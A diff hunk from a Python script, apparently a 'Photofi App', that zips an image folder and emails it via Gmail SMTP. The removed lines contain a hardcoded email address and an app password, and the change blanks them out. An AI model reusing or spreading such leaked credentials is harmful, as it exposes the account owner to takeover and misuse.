@@ -56,15 +56,15 @@ def main():  # start point
     zip_output_path = "output"
 
     # email user info
-    sender_email = 'brodyjason40@gmail.com'
-    receiver_email = 'brodyjason40@gmail.com'
+    sender_email = ''
+    receiver_email = ''
     subject = 'Using Photofi App sending you all of your image'
     body = 'Like you, your photos are beautiful'
     attachment_path = 'output.zip' # file name
     smtp_server = 'smtp.gmail.com'
     smtp_port = 465
-    smtp_username = 'brodyjason40@gmail.com'
-    smtp_password = 'dzyn dwhz uwzc qbmc'
+    smtp_username = ''
+    smtp_password = ''
 
     if(flag):
         zip_folder(zip_folder_path,zip_output_path)
